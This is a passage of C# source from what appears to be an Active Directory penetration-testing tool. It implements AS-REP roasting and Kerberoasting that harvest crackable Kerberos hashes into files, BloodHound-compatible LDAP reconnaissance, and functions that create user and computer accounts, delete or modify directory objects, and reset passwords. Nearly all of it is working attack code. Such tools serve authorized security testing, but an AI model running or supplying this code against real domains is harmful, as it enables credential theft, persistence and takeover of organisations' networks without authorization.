		var krb = this.Services.CreateKerberosClient(new SimpleKdcLocator(new System.Net.DnsEndPoint(host, Titanis.Security.Kerberos.KerberosClient.KdcTcpPort)));
		int roasted = 0;
		foreach (var sam in sams)
		{
			ct.ThrowIfCancellationRequested();
			try
			{
				var asrep = await krb.TryGetAsRepAsync(realm, sam, null, ct).ConfigureAwait(false);
				if (asrep is null)
				{
					AtlasConsole.Info($"{host}:{this.Port}", $"--asreproast: {sam} requires preauth after all (skipped)");
					continue;
				}
				string hash = $"$krb5asrep${asrep.EType}${sam}@{realm}:{asrep.Nonce}${Convert.ToHexString(asrep.Cipher).ToLowerInvariant()}";
				AtlasConsole.Success($"{host}:{this.Port}", $"{sam} - {hash}");
				await File.AppendAllTextAsync(this.Asreproast, hash + "\n", ct).ConfigureAwait(false);
				roasted++;
			}
			catch (Exception ex)
			{
				AtlasConsole.Fail($"{host}:{this.Port}", $"--asreproast: {sam} - {ex.Message}");
			}
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"--asreproast: {roasted}/{sams.Count} hash(es) saved to {this.Asreproast}");
	}

	private async Task QueryBloodhoundAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		string collection = this.Collection ?? "Default";
		string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");
		string outDir = $"bloodhound_{host}_{timestamp}";
		Directory.CreateDirectory(outDir);
		int total = 0;
		string domain = ldap.DomainRoot?.ToString()?.Replace("DC=", "").Replace(",", ".").ToUpperInvariant() ?? "UNKNOWN";

		async Task Collect(string name, string bhType, string filterStr, string[] attrs, Func<LdapEntry, Dictionary<string, object?>> mapper)
		{
			try
			{
				var filter = LdapFilter.Parse(filterStr);
				var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, attrs.Select(a => new AttributeSpec(a)).ToArray()) { Options = LdapQueryOptions.AllPages, PageSize = 500 };
				var result = await ldap.Search(query, ct).ConfigureAwait(false);
				var list = new List<Dictionary<string, object?>>();
				foreach (var e in result.Entries)
				{
					var dict = mapper(e);
					list.Add(dict);
				}
				// BloodHound CE meta: type, count, version, methods
				var meta = new Dictionary<string, object> { ["type"] = bhType, ["count"] = list.Count, ["version"] = 5, ["methods"] = 0 };
				string json = System.Text.Json.JsonSerializer.Serialize(new { data = list, meta }, new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
				string fileName = $"{timestamp}_{bhType}.json";
				await File.WriteAllTextAsync(Path.Combine(outDir, fileName), json, ct).ConfigureAwait(false);
				AtlasConsole.Success($"{host}:{this.Port}", $"--bloodhound: {bhType} collected {list.Count} object(s) -> {outDir}/{fileName}");
				Interlocked.Add(ref total, list.Count);
			}
			catch (Exception ex)
			{
				AtlasConsole.Warn($"{host}:{this.Port}", $"--bloodhound: {bhType} failed: {ex.Message}");
			}
		}

		var want = collection.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries).Select(s => s.ToLowerInvariant()).ToHashSet();
		bool wantAll(string c) => want.Contains("all") || want.Contains(c.ToLowerInvariant()) || want.Contains("default") && new[] { "group", "localadmin", "session", "trusts", "default", "domain", "computer", "user", "container", "gpo", "ous" }.Contains(c.ToLowerInvariant());

		if (wantAll("Group") || wantAll("All")) await Collect("groups", "groups", "(objectClass=group)", new[] { "cn", "distinguishedName", "member", "objectSid" }, e => {
			string sid = e["objectSid"]?.Value is byte[] b ? new System.Security.Principal.SecurityIdentifier(b, 0).Value : e["objectSid"]?.Value?.ToString() ?? "";
			string dn = e.EntryName?.ToString() ?? "";
			var members = new List<Dictionary<string, object>>();
			var mVal = e["member"]?.Value;
			if (mVal is System.Collections.IEnumerable en && mVal is not string) foreach (var m in en) members.Add(new Dictionary<string, object> { ["ObjectIdentifier"] = m?.ToString() ?? "", ["ObjectType"] = "User" });
			else if (mVal is string s) members.Add(new Dictionary<string, object> { ["ObjectIdentifier"] = s, ["ObjectType"] = "User" });
			return new Dictionary<string, object?> { ["ObjectIdentifier"] = sid, ["Properties"] = new Dictionary<string, object?> { ["domain"] = domain, ["name"] = (e["cn"]?.Value?.ToString() ?? "").ToUpperInvariant() + "@" + domain, ["distinguishedname"] = dn, ["highvalue"] = false }, ["Members"] = members, ["Aces"] = new List<object>() };
		});
		if (wantAll("User") || wantAll("All")) await Collect("users", "users", "(sAMAccountType=805306368)", new[] { "sAMAccountName", "distinguishedName", "objectSid", "memberOf", "userAccountControl", "pwdLastSet" }, e => {
			string sid = e["objectSid"]?.Value is byte[] b ? new System.Security.Principal.SecurityIdentifier(b, 0).Value : e["objectSid"]?.Value?.ToString() ?? "";
			string sam = e["sAMAccountName"]?.Value?.ToString() ?? "";
			string dn = e.EntryName?.ToString() ?? "";
			return new Dictionary<string, object?> { ["ObjectIdentifier"] = sid, ["Properties"] = new Dictionary<string, object?> { ["domain"] = domain, ["name"] = sam.ToUpperInvariant() + "@" + domain, ["distinguishedname"] = dn, ["enabled"] = !(e["userAccountControl"]?.Value?.ToString()?.Contains("514") ?? false) }, ["Aces"] = new List<object>(), ["GroupMembers"] = new List<object>() };
		});
		if (wantAll("Computer") || wantAll("All")) await Collect("computers", "computers", "(sAMAccountType=805306369)", new[] { "dNSHostName", "sAMAccountName", "distinguishedName", "operatingSystem", "objectSid" }, e => {
			string sid = e["objectSid"]?.Value is byte[] b ? new System.Security.Principal.SecurityIdentifier(b, 0).Value : e["objectSid"]?.Value?.ToString() ?? "";
			string dns = e["dNSHostName"]?.Value?.ToString() ?? e["sAMAccountName"]?.Value?.ToString() ?? "";
			return new Dictionary<string, object?> { ["ObjectIdentifier"] = sid, ["Properties"] = new Dictionary<string, object?> { ["domain"] = domain, ["name"] = dns.ToUpperInvariant(), ["distinguishedname"] = e.EntryName?.ToString(), ["operatingsystem"] = e["operatingSystem"]?.Value?.ToString() }, ["Aces"] = new List<object>(), ["LocalAdmins"] = new List<object>() };
		});
		if (wantAll("Domain") || wantAll("All")) await Collect("domains", "domains", "(objectClass=domainDNS)", new[] { "distinguishedName", "objectSid", "name" }, e => {
			string sid = e["objectSid"]?.Value is byte[] b ? new System.Security.Principal.SecurityIdentifier(b, 0).Value : e["objectSid"]?.Value?.ToString() ?? "";
			return new Dictionary<string, object?> { ["ObjectIdentifier"] = sid, ["Properties"] = new Dictionary<string, object?> { ["domain"] = domain, ["name"] = domain, ["distinguishedname"] = e.EntryName?.ToString() }, ["Aces"] = new List<object>(), ["Trusts"] = new List<object>() };
		});
		if (wantAll("Trusts") || wantAll("All")) await Collect("trusts", "domains", "(objectClass=trustedDomain)", new[] { "cn", "name", "trustDirection", "trustType" }, e => {
			return new Dictionary<string, object?> { ["ObjectIdentifier"] = e["cn"]?.Value?.ToString() ?? "", ["Properties"] = new Dictionary<string, object?> { ["name"] = e["name"]?.Value?.ToString() } };
		});
		if (wantAll("Container") || wantAll("All")) await Collect("ous", "ous", "(objectClass=organizationalUnit)", new[] { "distinguishedName", "ou" }, e => {
			return new Dictionary<string, object?> { ["ObjectIdentifier"] = e.EntryName?.ToString() ?? "", ["Properties"] = new Dictionary<string, object?> { ["distinguishedname"] = e.EntryName?.ToString(), ["name"] = e["ou"]?.Value?.ToString() } };
		});
		if (wantAll("GPO") || wantAll("All")) await Collect("gpos", "gpos", "(objectClass=groupPolicyContainer)", new[] { "displayName", "distinguishedName", "gPCFileSysPath" }, e => {
			return new Dictionary<string, object?> { ["ObjectIdentifier"] = e.EntryName?.ToString() ?? "", ["Properties"] = new Dictionary<string, object?> { ["name"] = e["displayName"]?.Value?.ToString(), ["distinguishedname"] = e.EntryName?.ToString() } };
		});

		// Create zip archive (BloodHound compatible export)
		try
		{
			string zipName = $"{outDir}.zip";
			if (File.Exists(zipName)) File.Delete(zipName);
			System.IO.Compression.ZipFile.CreateFromDirectory(outDir, zipName);
			AtlasConsole.Success($"{host}:{this.Port}", $"--bloodhound: zip created {zipName} ({new FileInfo(zipName).Length} bytes)");
		}
		catch (Exception ex)
		{
			AtlasConsole.Warn($"{host}:{this.Port}", $"--bloodhound: zip failed: {ex.Message}");
		}
	}

	private async Task<LdapDistinguishedName> ResolveDnAsync(LdapClient ldap, string spec, CancellationToken ct)
	{
		if (spec.Contains('='))
			return LdapDistinguishedName.Parse(spec);
		var filter = LdapFilter.Parse($"(sAMAccountName={EscapeFilter(spec)})");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, null) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0)
			throw new InvalidOperationException($"Object not found: {spec}");
		if (result.EntryCount > 1)
			throw new InvalidOperationException($"Multiple objects match '{spec}'; use a full DN");
		return result.Entries[0].EntryName;
	}

	private async Task AddUserAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		string sam = this.AddUser!;
		string dn = $"CN={sam},CN=Users,{ldap.DomainRoot}";
		var attrs = new Dictionary<string, object>
		{
			["objectClass"] = "user",
			["sAMAccountName"] = sam,
			["unicodePwd"] = System.Text.Encoding.Unicode.GetBytes($"\"{this.AddUserPass}\""),
		};
		await ldap.Add(LdapDistinguishedName.Parse(dn), attrs, ct).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--add-user: created {dn}");
		try
		{
			var req = new LdapModifyRequest(LdapDistinguishedName.Parse(dn));
			req.ReplaceValue("userAccountControl", 512);
			await ldap.Modify(req, ct).ConfigureAwait(false);
			AtlasConsole.Success($"{host}:{this.Port}", $"--add-user: enabled {sam} (userAccountControl=512)");
		}
		catch (Exception ex)
		{
			AtlasConsole.Warn($"{host}:{this.Port}", $"--add-user: created but failed to enable: {ex.Message}");
		}
	}

	private async Task AddComputerAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		string sam = this.AddComputer!;
		if (!sam.EndsWith('$'))
			sam += "$";
		string cn = sam.TrimEnd('$');
		string dn = $"CN={cn},CN=Computers,{ldap.DomainRoot}";
		var attrs = new Dictionary<string, object>
		{
			["objectClass"] = "computer",
			["sAMAccountName"] = sam,
			["userAccountControl"] = 4096,
			["unicodePwd"] = System.Text.Encoding.Unicode.GetBytes($"\"{this.AddComputerPass}\""),
		};
		await ldap.Add(LdapDistinguishedName.Parse(dn), attrs, ct).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--add-computer: created {dn} (sAMAccountName={sam})");
	}

	private async Task DeleteObjectAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var dn = await this.ResolveDnAsync(ldap, this.Delete!, ct).ConfigureAwait(false);
		await ldap.Delete(dn, ct).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--delete: deleted {dn}");
	}

	private async Task ModifyObjectAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var dn = await this.ResolveDnAsync(ldap, this.Modify!, ct).ConfigureAwait(false);
		var req = new LdapModifyRequest(dn);
		foreach (var raw in this.ModifyAttrs!.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
		{
			string name;
			string value;
			LdapChangeType type;
			if (raw.Contains("-="))
			{
				int i = raw.IndexOf("-=", StringComparison.Ordinal);
				name = raw[..i].Trim(); value = raw[(i + 2)..].Trim(); type = LdapChangeType.Delete;
			}
			else if (raw.Contains("+="))
			{
				int i = raw.IndexOf("+=", StringComparison.Ordinal);
				name = raw[..i].Trim(); value = raw[(i + 2)..].Trim(); type = LdapChangeType.Add;
			}
			else if (raw.Contains('='))
			{
				int i = raw.IndexOf('=');
				name = raw[..i].Trim(); value = raw[(i + 1)..].Trim(); type = LdapChangeType.Replace;
			}
			else
			{
				throw new FormatException($"Invalid change '{raw}'; expected attr=value, attr+=value, or attr-=value");
			}
			if (name.Length == 0)
				throw new FormatException($"Invalid change '{raw}'; empty attribute name");
			req.AddChange(name, new object[] { value }, type);
		}
		await ldap.Modify(req, ct).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--modify: updated {dn}");
	}

	private async Task SetPasswordAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var dn = await this.ResolveDnAsync(ldap, this.SetPassword!, ct).ConfigureAwait(false);
		var req = new LdapModifyRequest(dn);
		req.ReplaceValue("unicodePwd", System.Text.Encoding.Unicode.GetBytes($"\"{this.NewPassword}\""));
		await ldap.Modify(req, ct).ConfigureAwait(false);
		AtlasConsole.Success($"{host}:{this.Port}", $"--set-password: password reset for {dn}");
	}

	private async Task KerberoastAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		string dn0 = ldap.DomainRoot?.ToString() ?? string.Empty;
		string? realm = dn0.Replace("DC=", "", StringComparison.OrdinalIgnoreCase).Replace(",", ".").ToUpperInvariant();
		if (string.IsNullOrWhiteSpace(realm) || !realm.Contains('.'))
			realm = this.Authentication.UserDomain?.ToUpperInvariant();
		if (string.IsNullOrWhiteSpace(realm))
		{
			AtlasConsole.Fail($"{host}:{this.Port}", "--kerberoasting: cannot determine realm (use -d <domain>)");
			return;
		}
		var auth = this.Authentication;
		KerberosCredential cred;
		if (auth.NtlmHash is not null)
			cred = new KerberosKeyCredential(EnsureRealm(auth.UserName, realm), EType.Rc4Hmac, auth.NtlmHash.Bytes);
		else if (auth.AesKey is not null)
		{
			byte[] kb = auth.AesKey.Bytes;
			EType et = (kb.Length == 32) ? EType.Aes256CtsHmacSha1_96 : EType.Aes128CtsHmacSha1_96;
			cred = new KerberosKeyCredential(EnsureRealm(auth.UserName, realm), et, kb);
		}
		else if (!string.IsNullOrEmpty(auth.Password))
			cred = new KerberosPasswordCredential(EnsureRealm(auth.UserName, realm), auth.Password);
		else
		{
			AtlasConsole.Fail($"{host}:{this.Port}", "--kerberoasting requires credentials (-p, -H, or -AesKey)");
			return;
		}

		var spnQuery = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree,
			LdapFilter.Parse("(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"),
			new[] { new AttributeSpec("servicePrincipalName") }) { Options = LdapQueryOptions.AllPages };
		var spnResults = await ldap.Search(spnQuery, ct).ConfigureAwait(false);
		var spns = new List<string>();
		foreach (var entry in spnResults.Entries)
		{
			var attr = entry["servicePrincipalName"];
			if (attr?.Values is null) continue;
			foreach (var v in attr.Values)
				if (v is string s && s.Length > 0) spns.Add(s);
		}
		spns = spns.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
		AtlasConsole.Info($"{host}:{this.Port}", $"--kerberoasting: {spns.Count} SPN(s) discovered");

		var krb = this.Services.CreateKerberosClient(new SimpleKdcLocator(new System.Net.DnsEndPoint(host, KerberosClient.KdcTcpPort)));
		int roasted = 0;
		foreach (var spn in spns)
		{
			ct.ThrowIfCancellationRequested();
			try
			{
				TicketInfo tkt = await krb.GetTicketAsync(ParseSpn(spn),
					realm, cred, new TicketParameters { Options = KdcOptions.Canonicalize }, ct).ConfigureAwait(false);
				string hash = tkt.GetTicketHash();
				AtlasConsole.Success($"{host}:{this.Port}", $"{spn} - {hash}");
				await File.AppendAllTextAsync(this.Kerberoasting!, hash + "\n", ct).ConfigureAwait(false);
				roasted++;
			}
			catch (Exception ex)
			{
				AtlasConsole.Fail($"{host}:{this.Port}", $"{spn} - {ex.Message}");
			}
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"--kerberoasting: {roasted}/{spns.Count} hash(es) saved to {this.Kerberoasting}");
	}

	private static SecurityPrincipalName ParseSpn(string spn)
	{
		int slash = spn.IndexOf('/');
		if (slash > 0 && slash < spn.Length - 1)
			return new ServicePrincipalName(PrincipalNameType.ServiceInstance, spn[..slash], spn[(slash + 1)..]);
		return new ServicePrincipalName(PrincipalNameType.ServiceInstance, "HOST", spn);
	}

	private static UserPrincipalName EnsureRealm(UserPrincipalName? upn, string realm)
	{
		if (upn is null)
			throw new InvalidOperationException("A user name is required (-u)");
		if (!string.IsNullOrEmpty(upn.Realm))
			return upn;
		return new UserPrincipalName(upn.UserName, realm);
	}

	private static string EscapeFilter(string v) => v.Replace("\\", "\\5c").Replace("*", "\\2a").Replace("(", "\\28").Replace(")", "\\29").Replace("\0", "\\00");
}
